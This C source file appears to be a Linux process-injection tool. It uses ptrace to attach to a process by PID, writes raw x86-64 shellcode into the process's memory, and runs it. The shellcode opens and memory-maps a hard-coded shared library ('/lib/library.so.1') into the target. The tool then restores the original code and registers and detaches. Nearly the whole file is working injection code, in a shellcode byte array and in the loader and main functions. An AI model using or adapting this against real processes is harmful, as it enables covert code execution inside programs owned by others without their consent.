/**
 * Copyright (C) 2018 Matthew Bobrowski
 * 
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General PublicLicense
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */


#include <elf.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ptrace.h>

typedef struct object {
	char *path;
	char *strtab;
	char *dynstr;
	uint8_t *mapping;
	uint64_t symtab_size;
	uint64_t dynsym_size;

	Elf64_Sym *symtab;
	Elf64_Sym *dynsym;
	Elf64_Ehdr *e_hdr;
	Elf64_Phdr *p_hdr;
	Elf64_Shdr *s_hdr;
} object_t;


static const char shellcode[] =
	"\x90"
	"\x90"
	"\x90"
	"\x90"
	"\xeb\x31"
	"\x5f"
	"\x48\x31\xf6"
	"\x48\x31\xc0"
	"\xb0\x02"
	"\x0f\x05"
	"\x48\x31\xff"
	"\x48\x31\xf6"
	"\x66\xbe\x00\x20"
	"\x48\x31\xd2"
	"\xb2\x07"
	"\x4d\x31\xd2"
	"\x41\xb2\x02"
	"\x4d\x31\xc0"
	"\x41\x88\xc0"
	"\x4d\x31\xc9"
	"\x48\x31\xc0"
	"\xb0\x09"
	"\x0f\x05"
	"\xcc"
	"\xe8\xca\xff\xff\xff"
	"\x2f"
	"\x6c"
	"\x69\x62\x2f\x6c\x69\x62\x72"
	"\x61"
	"\x72\x79"
	"\x2e\x73\x6f"
	"\x2e\x31\x2e"
	"\x30\x00";


static void
ptrace_attach(pid_t pid)
{
	int result;
	
	if (ptrace(PTRACE_ATTACH, pid) == -1) {
		perror("ptrace(PTRACE_ATTACH)");
		exit(EXIT_FAILURE);
	}

	if (waitpid(pid, &result, WUNTRACED) != pid) {
		perror("waitpid");
		exit(EXIT_FAILURE);
	}
}


static void
ptrace_detach(pid_t pid)
{
	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
		perror("ptrace(PTRACE_DETACH)");
		exit(EXIT_FAILURE);
	}
}


static void
ptrace_peektext(pid_t pid, unsigned long address, void *object, size_t length)
{
	long i, word, read;
	long *buffer = NULL;

	i = read = 0;
	buffer = (long *) object;

	while (read < length) {
		word = ptrace(PTRACE_PEEKTEXT, pid, address + read);
		
		if ((word == -1) && errno) {
			perror("ptrace(PTRACE_PEEKTEXT)");
			exit(EXIT_FAILURE);
		}

		read += sizeof(long);
		buffer[i++] = word;
	}
}


static void
ptrace_poketext(pid_t pid, unsigned long address, void *data, size_t length)
{
	long counter, word, result;

	counter = 0;

	while (counter < length) {
		memcpy(&word, data + counter, sizeof(long));
		
		result = ptrace(PTRACE_POKETEXT, pid, address + counter, word);

		if (result == -1) {
			perror("ptrace(PTRACE_POKETEXT)");
			exit(EXIT_FAILURE);
		}

		counter += sizeof(long);
	}
}


static long 
loader(pid_t pid)
{
	long base;
	int status;
	long buffer[16];
	unsigned char *p;
	unsigned char text[128];
	unsigned long offset = 0x400000;
	struct user_regs_struct registers;
	
	unsigned long rip;
	unsigned long rax;
	unsigned long rdx;
	unsigned long rsi;
	unsigned long rdi;
	unsigned long r8;
	unsigned long r9;
	unsigned long r10;
	
	ptrace_peektext(pid, offset, buffer, 128);

	p = (unsigned char *) buffer;
	memcpy(text, p, 128);

	ptrace_poketext(pid, offset, (long *) shellcode, sizeof(shellcode));

	if (ptrace(PTRACE_GETREGS, pid, NULL, &registers) == -1) {
		perror("ptrace(PTRACE_GETREGS)");
		exit(EXIT_FAILURE);
	}

	rip = registers.rip;
	rax = registers.rax;
	rdx = registers.rdx;
	rsi = registers.rsi;
	rdi = registers.rdi;
	r8 = registers.r8;
	r9 = registers.r9;
	r10 = registers.r10;

	registers.rip = offset + 2;

	if (ptrace(PTRACE_SETREGS, pid, NULL, &registers) == -1) {
		perror("ptrace(PTRACE_SETREGS)");
		exit(EXIT_FAILURE);
	}

	if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
		perror("ptrace(PTRACE_CONT)");
		exit(EXIT_FAILURE);
	}

	do {
		wait(&status);
	} while (WIFSTOPPED(status) && WSTOPSIG(status) != SIGTRAP);

	if (ptrace(PTRACE_GETREGS, pid, NULL, &registers) == -1) {
		perror("ptrace(PTRACE_GETREGS)");
		exit(EXIT_FAILURE);
	}

	ptrace_poketext(pid, offset, (long *) text, 128);
	
	base = registers.rax;
	
	registers.rip = rip;
	registers.rax = rax;
	registers.rdx = rdx;
	registers.rsi = rsi;
	registers.rdi = rdi;
	registers.r8 = r8;
	registers.r9 = r9;
	registers.r10 = r10;

	if (ptrace(PTRACE_SETREGS, pid, NULL, &registers) == -1) {
		perror("ptrace(PTRACE_SETREGS)");
		exit(EXIT_FAILURE);
	}
	
	return base;
}


static void
mapper(const char *path, object_t *object)
{
	int i, fd, res;
	uint8_t *mapping;
	struct stat f_stat;
	Elf64_Ehdr *e_hdr;
        Elf64_Phdr *p_hdr;
        Elf64_Shdr *s_hdr;

	if ((object->path = strndup(path, strlen(path))) == NULL) {
		perror("strndup");
		exit(EXIT_FAILURE);
	}

	if ((fd = open(object->path, O_RDONLY)) == -1) {
		perror("open");
		exit(EXIT_FAILURE);
	}

	if ((res = fstat(fd, &f_stat)) == -1) {
		perror("fstat");
		exit(EXIT_FAILURE);
	}

	mapping = mmap(NULL, f_stat.st_size, PROT_READ, MAP_PRIVATE, fd, 0);

	if (mapping == MAP_FAILED) {
		perror("mmap");
		exit(EXIT_FAILURE);
	}
	
	object->mapping = (uint8_t *) mapping;
	object->e_hdr = e_hdr = (Elf64_Ehdr *) mapping;
	object->p_hdr = p_hdr = (Elf64_Phdr *) &mapping[e_hdr->e_phoff];
	object->s_hdr = s_hdr = (Elf64_Shdr *) &mapping[e_hdr->e_shoff];

        for (i = 0; i < e_hdr->e_shnum; i++) {
                switch (s_hdr[i].sh_type) {
                        case SHT_SYMTAB:
				object->strtab = (char *) 
				(mapping + 
				 object->s_hdr[s_hdr[i].sh_link].sh_offset);

				object->symtab_size = s_hdr[i].sh_size;
				object->symtab = (Elf64_Sym *)
                                (mapping + object->s_hdr[i].sh_offset);
                                break;
                        case SHT_DYNSYM:
				object->dynstr = (char *)
				(mapping +                                      
                                 object->s_hdr[s_hdr[i].sh_link].sh_offset);
	
				object->dynsym_size = s_hdr[i].sh_size;	
				object->dynsym = (Elf64_Sym *)
				(mapping + object->s_hdr[i].sh_offset);
                                break;
                        default:
                                break;
                }
        }
}


static Elf64_Addr                                                               
resolve_symbol(const char *name, object_t *object)                              
{                                                                               
        int i;
        char *strtab;
	uint64_t size;
        Elf64_Sym *symtab;                                                      
                                                                                
        strtab = object->strtab;
	symtab = object->symtab;
	size = object->symtab_size / sizeof(Elf64_Sym);

	for (i = 0; i < size; i++, symtab++) {
		if (strcmp(&strtab[symtab->st_name], name) == 0)
			return (symtab->st_value);
	}
                                                                                
        return -1;
}


int
main(int argc, char **argv)
{
	pid_t pid;
	long base;
	object_t *parasite;

	if (argc < 3) {
		printf("Invalid number of command line arguments provided\n");
		exit(EXIT_FAILURE);
	}

	parasite = malloc(sizeof(object_t));
	
	if (!parasite) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	mapper(argv[2], parasite);

	pid = atoi(argv[1]);

	ptrace_attach(pid);	
	base = loader(pid);

	if (base < 0) {
		printf("Library mapping in tracee's address space failed\n");
		exit(EXIT_FAILURE);	
	}

	ptrace_detach(pid);

	free(parasite);

	exit(EXIT_SUCCESS);
}
